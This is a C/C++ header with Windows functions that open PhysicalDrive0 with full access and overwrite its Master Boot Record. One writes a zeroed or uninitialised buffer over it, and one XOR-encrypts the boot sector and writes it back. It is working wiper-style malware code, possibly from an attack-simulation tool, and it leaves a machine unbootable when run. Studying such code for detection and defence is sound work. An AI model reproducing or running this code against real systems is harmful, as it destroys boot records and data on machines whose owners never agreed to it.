#pragma once
#include "stdafx.h"
#include "Helper.h"

void MBROverWriteWithUnInitializedBufferOrZero(DWORD, HANDLE, WORD, bool);
void XorEncryptMBRCode(DWORD, HANDLE , WORD);
void MBROverWrite(DWORD , HANDLE , WORD , LPVOID );

void MBROverWriteWithUnInitializedBufferOrZero( DWORD CodeSize, HANDLE hConsole, WORD wOriginalAttributes, bool bSimFlag)
{
    HANDLE fh=0;
    if ((fh = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0)) == INVALID_HANDLE_VALUE)
    {
        ErrorExit(TEXT("(MBROverWriteWithUnInitializedBuffer) - CreateFile - PhysicalDrive0 "), hConsole, wOriginalAttributes);
        CloseHandle(fh);
    }

    SuccessMsg(TEXT("to open a handle in PhysicalDrive0 for writing\n"), hConsole, wOriginalAttributes);
    LPVOID ptrlpMalBuffer = malloc(CodeSize);
    if (ptrlpMalBuffer == NULL)
    {
        CloseHandle(fh);
        ErrorExit(TEXT("(MBROverWriteWithUnInitializedBuffer) - malloc "), hConsole, wOriginalAttributes);
    }
    if (bSimFlag)
    {
        memset(ptrlpMalBuffer, 0, CodeSize);
    }

    if (!WriteFile(fh, ptrlpMalBuffer, CodeSize, NULL, 0))
    {
        ErrorExit(TEXT("(MBROverWriteWithUnInitializedBuffer) - WriteFile - PhysicalDrive0 "), hConsole, wOriginalAttributes);
    }
    SuccessMsg(TEXT("to write in PhysicalDrive0 MBR sector\n"), hConsole, wOriginalAttributes);

    CloseHandle(fh);
    free(ptrlpMalBuffer);
}

VOID XorEncryptMBRCode(DWORD BOOT_SECTOR_SIZE, HANDLE hConsole, WORD wOriginalAttributes)
{

    HANDLE fh = 0;
    fh = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ| FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (fh == INVALID_HANDLE_VALUE)
    {
        ErrorExit(TEXT("(XorEncryptMBRCode) - CreateFile - PhysicalDrive0 "), hConsole, wOriginalAttributes);
        CloseHandle(fh);
        exit(1);
    }
    SuccessMsg(TEXT("in opening a handle of PhysicalDrive0\n"), hConsole, wOriginalAttributes);
    
    
    DWORD dwNumOfBytesToRead = BOOT_SECTOR_SIZE;
    DWORD dwNumOfBytesRead = 0;
    LPVOID lpBuffer;
    size_t i, j;

    lpBuffer = malloc(BOOT_SECTOR_SIZE);
    if (NULL == lpBuffer)
    {
        CloseHandle(fh);
        ErrorExit(TEXT("(XorEncryptMBRCode) - malloc "), hConsole, wOriginalAttributes);


    }

    if (!ReadFile(fh, lpBuffer, dwNumOfBytesToRead, &dwNumOfBytesRead, NULL))
    {
        CloseHandle(fh);
        ErrorExit(TEXT("(XorEncryptMBRCode) - ReadFile - PhysicalDrive0 "), hConsole, wOriginalAttributes);

    }

    SuccessMsg(TEXT("in reading PhysicalDrive0 MBR code\n"), hConsole, wOriginalAttributes);

    for (i = 0; i < BOOT_SECTOR_SIZE; i++)
    {
        ((unsigned char*)lpBuffer)[i] = ((unsigned char*)lpBuffer)[i] ^ 7;
        //printf("%02X", ((unsigned char*)lpBuffer)[i]);
    }

    CloseHandle(fh);

    MBROverWrite(BOOT_SECTOR_SIZE, hConsole, wOriginalAttributes, lpBuffer);

    free(lpBuffer);
    return ;
}


void MBROverWrite( DWORD CodeSize, HANDLE hConsole, WORD wOriginalAttributes, LPVOID ptrlpMalBuffer)
{
    HANDLE fh;

    if ((fh = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0)) == INVALID_HANDLE_VALUE)
    {
        ErrorExit(TEXT("(MBROverWrite) - CreateFile - PhysicalDrive0 "), hConsole, wOriginalAttributes);
        CloseHandle(fh);
    }

    SuccessMsg(TEXT("in opening a handle of PhysicalDrive0 for writing\n"), hConsole, wOriginalAttributes);
    if (!WriteFile(fh, ptrlpMalBuffer, CodeSize, NULL, 0))
    {
        ErrorExit(TEXT("(MBROverWrite) - WriteFile - PhysicalDrive0 "), hConsole, wOriginalAttributes);
    }
    SuccessMsg(TEXT("in overwriting MBR sector.\n"), hConsole, wOriginalAttributes);

    CloseHandle(fh);
}
